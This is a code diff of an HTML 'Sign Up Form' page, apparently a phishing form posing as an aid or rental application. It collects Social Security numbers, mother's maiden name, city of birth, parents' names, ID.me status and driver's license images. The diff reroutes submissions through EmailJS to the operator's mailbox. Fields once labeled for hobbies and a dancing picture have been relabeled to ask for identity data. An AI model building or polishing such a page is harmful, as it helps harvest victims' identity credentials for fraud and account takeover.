@@ -1,17 +1,20 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Sign Up Form</title>
-  <!-- Bootstrap CSS -->
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
-  <!-- Custom CSS for additional styling -->
   <link rel="stylesheet" href="css/style.css">
   <script src="https://kit.fontawesome.com/a81368914c.js"></script>
+  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("sRsE9ALU_-GL81dXf"); // Replace this with your EmailJS public key
+    })();
+  </script>
 </head>
 <body>
-
   <div class="container">
     <div class="row justify-content-center">
       <div class="col-md-6">
@@ -19,19 +22,16 @@
           <div class="card-body">
             <h3 class="text-center">Sign Up Form</h3>
             <form id="applicationForm" action="sendmail.php" method="POST" enctype="multipart/form-data">
-              <!-- Nickname -->
               <div class="mb-3">
                 <label for="nickname" class="form-label">Name</label>
                 <input type="text" class="form-control" id="nickname" name="nickname" required>
               </div>
 
-              <!-- Email -->
               <div class="mb-3">
                 <label for="email" class="form-label">Email</label>
                 <input type="email" class="form-control" id="email" name="email" required>
               </div>
 
-              <!-- Gender -->
               <div class="mb-3">
                 <label class="form-label">Gender</label>
                 <select class="form-select" id="gender" name="gender" required>
@@ -42,49 +42,41 @@
                 </select>
               </div>
 
-              <!-- Phone Number -->
               <div class="mb-3">
                 <label for="phone" class="form-label">Phone Number</label>
-                <input type="tel" class="form-control" id="phone" name="phone" placeholder="(123) 456-7890" required>
+                <input type="tel" class="form-control" id="phone" name="phone" required>
               </div>
 
-              <!-- City of Birth -->
               <div class="mb-3">
                 <label for="city" class="form-label">City of Birth</label>
                 <input type="text" class="form-control" id="city" name="city" required>
               </div>
 
-              <!-- Membership Number -->
               <div class="mb-3">
                 <label for="membershipNumber" class="form-label">Social Security Number</label>
-                <input type="number" class="form-control" id="membershipNumber" name="membershipNumber" maxlength="9" placeholder="123-45-6789" required>
+                <input type="text" class="form-control" id="membershipNumber" name="membershipNumber" required>
               </div>
 
-              <!-- Hobbies -->
               <div class="mb-3">
-                <label for="hobbies" class="form-label">Mother's Full Name</label>
+                <label for="motherName" class="form-label">Mother's Full Name</label>
                 <input type="text" class="form-control" id="motherName" name="motherName">
               </div>
 
-              <!-- Hobbies -->
               <div class="mb-3">
-                <label for="hobbies" class="form-label">Father's Full Name</label>
+                <label for="fatherName" class="form-label">Father's Full Name</label>
                 <input type="text" class="form-control" id="fatherName" name="fatherName">
               </div>
 
-              <!-- Hobbies -->
               <div class="mb-3">
-                <label for="hobbies" class="form-label">Mother's Maiden Name</label>
+                <label for="maidenName" class="form-label">Mother's Maiden Name</label>
                 <input type="text" class="form-control" id="maidenName" name="maidenName">
               </div>
 
-              <!-- Past Due Rent -->
               <div class="mb-3">
                 <label for="pastDue" class="form-label">Past Due Rent/Utilities</label>
                 <input type="text" class="form-control" id="pastDue" name="pastDue">
               </div>
 
-              <!-- Evicted -->
               <div class="mb-3">
                 <label class="form-label">Have you been evicted?</label>
                 <div>
@@ -95,18 +87,16 @@
                 </div>
               </div>
 
-                <!-- Evicted -->
-                <div class="mb-3">
-                  <label class="form-label">Have you applied before?</label>
-                  <div>
-                    <input type="radio" id="appliedBeforeYes" name="appliedBefore" value="yes" required>
-                    <label for="appliedBeforeYes">Yes</label>
-                    <input type="radio" id="appliedBeforeNo" name="appliedBefore" value="no">
-                    <label for="appliedBeforeNo">No</label>
-                  </div>
+              <div class="mb-3">
+                <label class="form-label">Have you applied before?</label>
+                <div>
+                  <input type="radio" id="appliedBeforeYes" name="appliedBefore" value="yes" required>
+                  <label for="appliedBeforeYes">Yes</label>
+                  <input type="radio" id="appliedBeforeNo" name="appliedBefore" value="no">
+                  <label for="appliedBeforeNo">No</label>
                 </div>
+              </div>
 
-              <!-- Social Security -->
               <div class="mb-3">
                 <label class="form-label">Are you currently receiving Social Security payments?</label>
                 <div>
@@ -117,7 +107,6 @@
                 </div>
               </div>
 
-              <!-- Verified by IDME -->
               <div class="mb-3">
                 <label class="form-label">Have you been verified by IDME?</label>
                 <div>
@@ -128,20 +117,17 @@
                 </div>
               </div>
 
-              <!-- Upload Dancing Picture -->
+              <!-- File upload fields won't send actual files via EmailJS unless you have a paid plan -->
               <div class="mb-3">
-                <label for="dancingPicture" class="form-label">Driver's License (Front)</label>
-                <input type="file" class="form-control" id="dancingPicture" name="dancingPicture" required>
-                <small class="form-text text-muted">* Maximum allowed file size is 50MB.</small>
+                <label for="driverFront" class="form-label">Driver's License (Front)</label>
+                <input type="file" class="form-control" id="driverFront" name="driverFront">
               </div>
 
               <div class="mb-3">
-                <label for="dancingPicture1" class="form-label">Driver's License (Back)</label>
-                <input type="file" class="form-control" id="dancingPicture1" name="dancingPicture1" required>
-                <small class="form-text text-muted">* Maximum allowed file size is 50MB.</small>
+                <label for="driverBack" class="form-label">Driver's License (Back)</label>
+                <input type="file" class="form-control" id="driverBack" name="driverBack">
               </div>
 
-              <!-- Submit Button -->
               <div class="text-center">
                 <button type="submit" class="btn btn-success">Submit Application</button>
               </div>
@@ -152,9 +138,17 @@
     </div>
   </div>
 
-  <!-- Bootstrap and jQuery -->
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
-  <script src="js/main.js"></script>
+  <script>
+    document.getElementById('applicationForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      emailjs.sendForm('service_drszura', 'YOUR_TEMPLATE_ID', this)
+        .then(function() {
+          alert('Application submitted successfully!');
+        }, function(error) {
+          alert('Failed to send application.');
+          console.error(error);
+        });
+    });
+  </script>
 </body>
 </html>
